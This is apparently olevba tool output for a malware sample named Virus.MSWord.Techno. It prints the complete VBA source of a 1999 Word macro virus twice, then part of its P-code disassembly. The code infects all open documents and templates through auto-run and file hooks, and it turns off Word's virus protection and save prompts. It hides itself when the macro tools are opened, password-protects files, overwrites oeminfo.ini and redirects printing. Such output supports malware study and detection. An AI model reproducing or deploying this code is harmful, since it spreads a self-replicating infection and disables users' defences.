olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Techno
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Techno - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VrTechnoCode.bas 
in file: ./Virus.MSWord.Techno - OLE stream: 'Macros/VBA/VrTechnoCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
    '-------------------------------------------------------'
    '  VR Òåõíîëîãèÿ v1.1 by John Great from Russia (C)'99  '
    '-------------------------------------------------------'

Const VrMName As String = "VrTechnoCode"
Const VrVersion As String = "VrTechno V1.1"
Const VrPassword As String = "Elite"
Const VrCopyright As String = "Word Macro ÂÈÐÓÑ!!!" & vbCr & "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"

'-------------------'
'  Install-Module:  '
'-------------------'

Private Sub VrInstall(): On Error Resume Next
Application.EnableCancelKey = 0: Application.DisplayAlerts = 0: WordBasic.DisableAutoMacros 0
'Ïðîâåðêà èíñòàëÿöèè
    For Each aDoc In Documents
    If aDoc.VBProject.Description <> VrVersion Then GoSub VrInfect Else If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    Next
    For Each aDoc In Templates
    If aDoc.VBProject.Description <> VrVersion Then
    GoSub VrInfect: aDoc.Save
    Else: If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    End If: Next: GoTo Err_Code
VrInfect:
    VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
    MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
    aDoc.VBProject.VBComponents.Import (VrFName): Kill (VrFName)
    aDoc.VBProject.Description = VrVersion
    WordBasic.SetPrivateProfileString "VrTechno", "Version", VrVersion, "win.ini"
    x = WordBasic.[GetPrivateProfileString$]("VrTechno", "Install", "win.ini")
    WordBasic.SetPrivateProfileString "VrTechno", "Install", CStr(IIf(x = "", 0, x) + 1), "win.ini"
Return
Err_Code:
If IsChance(9) Then AddOemInfo
If IsChance(20) Then CreateImageScreen
End Sub

'-------------------'
'  Infect-Module:   '
'-------------------'

'Îòêðûòü
Sub AutoOpen(): VrInstall: End Sub
Sub AutoExec(): VrInstall: End Sub
Sub FileOpen(): WordBasic.DisableAutoMacros True
If Dialogs(wdDialogFileOpen).Show Then VrInstall
End Sub
'Íîâûé äîêóìåíò
Sub FileNew(): Application.Documents.Add: VrInstall: End Sub
Sub FileNewDefault()
Application.Documents.Add Template:=NormalTemplate.FullName: VrInstall: End Sub
'Ñîõðàíèòü
Sub FileSaveAs(): VrInstall
If Dialogs(wdDialogFileSaveAs).Show Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
Sub FileSave(): On Error Resume Next: VrInstall: ActiveDocument.Save
If ActiveDocument.Saved Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
'Çàêðûòü
Sub FileClose(): FileSave
If ActiveDocument.Saved Then
If ActiveDocument.ProtectionType = -1 Then ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.Save: End If: ActiveDocument.Close wdDoNotSaveChanges: End Sub
Sub DocClose(): FileClose: End Sub

'-------------------'
'  Stealth-Module:  '
'-------------------'

Sub ViewVBCode(): VrStealth: End Sub    'ToolsCustomize
Sub ToolsMacro(): VrStealth: End Sub
Sub FileTemplates(): VrStealth: End Sub
Sub ToolsOptions()
If Dialogs(wdDialogToolsOptions).Show Then
Options.SaveNormalPrompt = 0: Options.VirusProtection = 0
End If: End Sub
Private Sub VrStealth()
If IsChance(5) Then
With Assistant.NewBalloon
    .Animation = msoAnimationThinking
    .Button = msoButtonSetOK
    .Heading = "VR Òåõíîëîãèÿ v1.0"
    .Text = VrCopyright
    .Show
End With: End If: End Sub
Private Function IsChance(Num As Integer) As Boolean
Randomize: IsChance = Not CBool(Int(Rnd * Num)): End Function

'-------------------'
' Destruct-Module:  '
'-------------------'

Sub FilePrint(): With Dialogs.Item(wdDialogFilePrint)
If IsChance(5) Then .FileName = "C:\autoexec.bat"
.Show: End With: End Sub
Sub FilePrintDefault()
If IsChance(5) Then Application.PrintOut FileName:="C:\autoexec.bat" Else ActiveDocument.PrintOut
End Sub

Private Sub AddOemInfo(): On Error Resume Next: fn = "C:\Windows\System"
If Dir(fn, vbDirectory) <> "" Then
fn = fn + "\oeminfo.ini": Kill (fn): Open fn For Output As #1
Print #1, "[General]"
Print #1, "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
Print #1, "Model=MS Word Âèðóñ"
Print #1, "[Support Information]"
Print #1, "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: " + VrVersion
Print #1, "Line2="
Print #1, "Line3=Word Macro Virus"
Print #1, "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
Close #1: End If: End Sub

Private Sub CreateImageScreen()
On Error Resume Next: Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled
If ActiveDocument.ProtectionType = wdNoProtection Then
x0 = (ActiveDocument.PageSetup.PageWidth - 410) / 2: y0 = ActiveDocument.PageSetup.TopMargin
Set aShape = ActiveDocument.Shapes.AddShape(msoShapeRoundedRectangle, x0, y0, 410, 130)
With aShape
.Fill.Visible = msoTrue
.Fill.ForeColor.RGB = RGB(255, 255, 255)
.Fill.Transparency = 0.5
.Fill.OneColorGradient msoGradientHorizontal, 4, 0.23
.ZOrder msoBringInFrontOfText
.TextFrame.TextRange.Select
With Selection
.LanguageID = wdEnglishUS
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Bold = True: .Font.Italic = False
.Font.Name = "Times New Roman": .Font.Size = 20
.TypeText Text:="Microsoft Word Macro Virus"
.Font.Italic = True: .Font.Size = 14
.TypeText Text:=vbCr + "VrTechnoCode" + vbCr
.Font.Italic = False: .Font.Bold = False: .Font.Size = 10
.ParagraphFormat.Alignment = wdAlignParagraphLeft
.TypeText Text:="- Word 7.0" + vbCr + "- Stealth Technology" + vbCr + "- Infect Documents and Templates" + vbCr + vbCrLf
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Italic = True: .Font.Bold = True: .Font.Size = 14
.TypeText Text:="Copyright by John Great from Russia Far East, Khabarovsk'1999"
End With: End With
With ActiveDocument.Shapes.AddShape(msoShapeExplosion1, x0 + 225, y0 + 25, 180, 72)
.IncrementRotation 180#
.Fill.Visible = msoTrue
.Fill.PresetGradient msoGradientHorizontal, 1, msoGradientFire
.ZOrder msoSendBehindText
.TextFrame.TextRange.Select
With Selection
.Font.Bold = True: .Font.Italic = True
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Name = "Times New Roman": .Font.Size = 16
.TypeText Text:="Version 1.1"
End With
ActiveDocument.Shapes.Range(Array(aShape.Name, .Name)).Select
Selection.ShapeRange.Group.Select: ActiveDocument.UndoClear
End With: End If: Application.ScreenUpdating = -1: End Sub
-------------------------------------------------------------------------------
VBA MACRO VrTechnoCode1.bas 
in file: ./Virus.MSWord.Techno - OLE stream: 'Macros/VBA/VrTechnoCode1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
    '-------------------------------------------------------'
    '  VR Òåõíîëîãèÿ v1.1 by John Great from Russia (C)'99  '
    '-------------------------------------------------------'

Const VrMName As String = "VrTechnoCode"
Const VrVersion As String = "VrTechno V1.1"
Const VrPassword As String = "Elite"
Const VrCopyright As String = "Word Macro ÂÈÐÓÑ!!!" & vbCr & "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"

'-------------------'
'  Install-Module:  '
'-------------------'

Private Sub VrInstall(): On Error Resume Next
Application.EnableCancelKey = 0: Application.DisplayAlerts = 0: WordBasic.DisableAutoMacros 0
'Ïðîâåðêà èíñòàëÿöèè
    For Each aDoc In Documents
    If aDoc.VBProject.Description <> VrVersion Then GoSub VrInfect Else If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    Next
    For Each aDoc In Templates
    If aDoc.VBProject.Description <> VrVersion Then
    GoSub VrInfect: aDoc.Save
    Else: If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    End If: Next: GoTo Err_Code
VrInfect:
    VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
    MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
    aDoc.VBProject.VBComponents.Import (VrFName): Kill (VrFName)
    aDoc.VBProject.Description = VrVersion
    WordBasic.SetPrivateProfileString "VrTechno", "Version", VrVersion, "win.ini"
    x = WordBasic.[GetPrivateProfileString$]("VrTechno", "Install", "win.ini")
    WordBasic.SetPrivateProfileString "VrTechno", "Install", CStr(IIf(x = "", 0, x) + 1), "win.ini"
Return
Err_Code:
If IsChance(9) Then AddOemInfo
If IsChance(20) Then CreateImageScreen
End Sub

'-------------------'
'  Infect-Module:   '
'-------------------'

'Îòêðûòü
Sub AutoOpen(): VrInstall: End Sub
Sub AutoExec(): VrInstall: End Sub
Sub FileOpen(): WordBasic.DisableAutoMacros True
If Dialogs(wdDialogFileOpen).Show Then VrInstall
End Sub
'Íîâûé äîêóìåíò
Sub FileNew(): Application.Documents.Add: VrInstall: End Sub
Sub FileNewDefault()
Application.Documents.Add Template:=NormalTemplate.FullName: VrInstall: End Sub
'Ñîõðàíèòü
Sub FileSaveAs(): VrInstall
If Dialogs(wdDialogFileSaveAs).Show Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
Sub FileSave(): On Error Resume Next: VrInstall: ActiveDocument.Save
If ActiveDocument.Saved Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
'Çàêðûòü
Sub FileClose(): FileSave
If ActiveDocument.Saved Then
If ActiveDocument.ProtectionType = -1 Then ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.Save: End If: ActiveDocument.Close wdDoNotSaveChanges: End Sub
Sub DocClose(): FileClose: End Sub

'-------------------'
'  Stealth-Module:  '
'-------------------'

Sub ViewVBCode(): VrStealth: End Sub    'ToolsCustomize
Sub ToolsMacro(): VrStealth: End Sub
Sub FileTemplates(): VrStealth: End Sub
Sub ToolsOptions()
If Dialogs(wdDialogToolsOptions).Show Then
Options.SaveNormalPrompt = 0: Options.VirusProtection = 0
End If: End Sub
Private Sub VrStealth()
If IsChance(5) Then
With Assistant.NewBalloon
    .Animation = msoAnimationThinking
    .Button = msoButtonSetOK
    .Heading = "VR Òåõíîëîãèÿ v1.0"
    .Text = VrCopyright
    .Show
End With: End If: End Sub
Private Function IsChance(Num As Integer) As Boolean
Randomize: IsChance = Not CBool(Int(Rnd * Num)): End Function

'-------------------'
' Destruct-Module:  '
'-------------------'

Sub FilePrint(): With Dialogs.Item(wdDialogFilePrint)
If IsChance(5) Then .FileName = "C:\autoexec.bat"
.Show: End With: End Sub
Sub FilePrintDefault()
If IsChance(5) Then Application.PrintOut FileName:="C:\autoexec.bat" Else ActiveDocument.PrintOut
End Sub

Private Sub AddOemInfo(): On Error Resume Next: fn = "C:\Windows\System"
If Dir(fn, vbDirectory) <> "" Then
fn = fn + "\oeminfo.ini": Kill (fn): Open fn For Output As #1
Print #1, "[General]"
Print #1, "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
Print #1, "Model=MS Word Âèðóñ"
Print #1, "[Support Information]"
Print #1, "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: " + VrVersion
Print #1, "Line2="
Print #1, "Line3=Word Macro Virus"
Print #1, "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
Close #1: End If: End Sub

Private Sub CreateImageScreen()
On Error Resume Next: Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled
If ActiveDocument.ProtectionType = wdNoProtection Then
x0 = (ActiveDocument.PageSetup.PageWidth - 410) / 2: y0 = ActiveDocument.PageSetup.TopMargin
Set aShape = ActiveDocument.Shapes.AddShape(msoShapeRoundedRectangle, x0, y0, 410, 130)
With aShape
.Fill.Visible = msoTrue
.Fill.ForeColor.RGB = RGB(255, 255, 255)
.Fill.Transparency = 0.5
.Fill.OneColorGradient msoGradientHorizontal, 4, 0.23
.ZOrder msoBringInFrontOfText
.TextFrame.TextRange.Select
With Selection
.LanguageID = wdEnglishUS
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Bold = True: .Font.Italic = False
.Font.Name = "Times New Roman": .Font.Size = 20
.TypeText Text:="Microsoft Word Macro Virus"
.Font.Italic = True: .Font.Size = 14
.TypeText Text:=vbCr + "VrTechnoCode" + vbCr
.Font.Italic = False: .Font.Bold = False: .Font.Size = 10
.ParagraphFormat.Alignment = wdAlignParagraphLeft
.TypeText Text:="- Word 7.0" + vbCr + "- Stealth Technology" + vbCr + "- Infect Documents and Templates" + vbCr + vbCrLf
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Italic = True: .Font.Bold = True: .Font.Size = 14
.TypeText Text:="Copyright by John Great from Russia Far East, Khabarovsk'1999"
End With: End With
With ActiveDocument.Shapes.AddShape(msoShapeExplosion1, x0 + 225, y0 + 25, 180, 72)
.IncrementRotation 180#
.Fill.Visible = msoTrue
.Fill.PresetGradient msoGradientHorizontal, 1, msoGradientFire
.ZOrder msoSendBehindText
.TextFrame.TextRange.Select
With Selection
.Font.Bold = True: .Font.Italic = True
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Name = "Times New Roman": .Font.Size = 16
.TypeText Text:="Version 1.1"
End With
ActiveDocument.Shapes.Range(Array(aShape.Name, .Name)).Select
Selection.ShapeRange.Group.Select: ActiveDocument.UndoClear
End With: End If: Application.ScreenUpdating = -1: End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Techno
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1055 bytes
' Macros/VBA/VrTechnoCode - 11427 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0004 0x0038 "-------------------------------------------------------'"
' Line #2:
' 	QuoteRem 0x0004 0x0038 "  VR Òåõíîëîãèÿ v1.1 by John Great from Russia (C)'99  '"
' Line #3:
' 	QuoteRem 0x0004 0x0038 "-------------------------------------------------------'"
' Line #4:
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x000C "VrTechnoCode"
' 	VarDefn VrMName (As String)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000D "VrTechno V1.1"
' 	VarDefn VrVersion (As String)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0005 "Elite"
' 	VarDefn VrPassword (As String)
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0013 "Word Macro ÂÈÐÓÑ!!!"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"
' 	Concat 
' 	VarDefn VrCopyright (As String)
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #11:
' 	QuoteRem 0x0000 0x0014 "  Install-Module:  '"
' Line #12:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub VrInstall())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	QuoteRem 0x0000 0x0013 "Ïðîâåðêà èíñòàëÿöèè"
' Line #17:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #18:
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd Description 
' 	Ld VrVersion 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoSub VrInfect 
' 	Else 
' 	BoSImplicit 
' 	Ld aDoc 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld VrPassword 
' 	Ld aDoc 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #21:
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd Description 
' 	Ld VrVersion 
' 	Ne 
' 	IfBlock 
' Line #22:
' 	GoSub VrInfect 
' 	BoS 0x0000 
' 	Ld aDoc 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld aDoc 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld VrPassword 
' 	Ld aDoc 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' Line #24:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	GoTo Err_Code 
' Line #25:
' 	Label VrInfect 
' Line #26:
' 	Ld wdProgramPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Ld VrMName 
' 	Add 
' 	Concat 
' 	St VrFName 
' Line #27:
' 	Ld VrFName 
' 	Paren 
' 	Ld VrMName 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	Ld VrFName 
' 	Paren 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld VrFName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	Ld VrVersion 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #30:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Version"
' 	Ld VrVersion 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #31:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Install"
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St x 
' Line #32:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Install"
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LitDI2 0x0000 
' 	Ld x 
' 	ArgsLd IIf 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	Coerce (Str) 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #33:
' 	Return 
' Line #34:
' 	Label Err_Code 
' Line #35:
' 	LitDI2 0x0009 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AddOemInfo 0x0000 
' 	EndIf 
' Line #36:
' 	LitDI2 0x0014 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CreateImageScreen 0x0000 
' 	EndIf 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #40:
' 	QuoteRem 0x0000 0x0014 "  Infect-Module:   '"
' Line #41:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #42:
' Line #43:
' 	QuoteRem 0x0000 0x0007 "Îòêðûòü"
' Line #44:
' 	FuncDefn (Sub AutoOpen())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub AutoExec())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FileOpen())
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #47:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	If 
' 	BoSImplicit 
' 	ArgsCall VrInstall 0x0000 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' 	QuoteRem 0x0000 0x000E "Íîâûé äîêóìåíò"
' Line #50:
' 	FuncDefn (Sub FileNew())
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileNewDefault())
' Line #52:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Template 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #53:
' 	QuoteRem 0x0000 0x0009 "Ñîõðàíèòü"
' Line #54:
' 	FuncDefn (Sub FileSaveAs())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' Line #55:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub FileSave())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	IfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #61:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #62:
' 	QuoteRem 0x0000 0x0007 "Çàêðûòü"
' Line #63:
' 	FuncDefn (Sub FileClose())
' 	BoS 0x0000 
' 	ArgsCall FileSave 0x0000 
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	IfBlock 
' Line #65:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld VrPassword 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' 	EndIf 
' Line #66:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	BoS 0x0000 
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub DocClose())
' 	BoS 0x0000 
' 	ArgsCall FileClose 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #70:
' 	QuoteRem 0x0000 0x0014 "  Stealth-Module:  '"
' Line #71:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #72:
' Line #73:
' 	FuncDefn (Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0028 0x000E "ToolsCustomize"
' Line #74:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub ToolsOptions())
' Line #77:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #78:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub VrStealth())
' Line #81:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	IfBlock 
' Line #82:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #83:
' 	Ld msoAnimationThinking 
' 	MemStWith Animation 
' Line #84:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #85:
' 	LitStr 0x0012 "VR Òåõíîëîãèÿ v1.0"
' 	MemStWith Heading 
' Line #86:
' 	Ld VrCopyright 
' 	MemStWith Then 
' Line #87:
' 	ArgsMemCallWith Show 0x0000 
' Line #88:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Function IsChance(Num As Integer) As Boolean)
' Line #90:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Num 
' 	Mul 
' 	FnInt 
' 	Coerce (Bool) 
' 	Not 
' 	St IsChance 
' 	BoS 0x0000 
' 	EndFunc 
' Line #91:
' Line #92:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #93:
' 	QuoteRem 0x0000 0x0014 " Destruct-Module:  '"
' Line #94:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #95:
' Line #96:
' 	FuncDefn (Sub FilePrint())
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld wdDialogFilePrint 
' 	Ld Dialogs 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #97:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	MemStWith FileName 
' 	EndIf 
' Line #98:
' 	ArgsMemCallWith Show 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FilePrintDefault())
' Line #100:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ParamNamed FileName 
' 	Ld Application 
' 	ArgsMemCall PrintOut 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' 	EndIf 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Private Sub AddOemInfo())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitStr 0x0011 "C:\Windows\System"
' 	St fn 
' Line #104:
' 	Ld fn 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #105:
' 	Ld fn 
' 	LitStr 0x000C "\oeminfo.ini"
' 	Add 
' 	St fn 
' 	BoS 0x0000 
' 	Ld fn 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "[General]"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Model=MS Word Âèðóñ"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
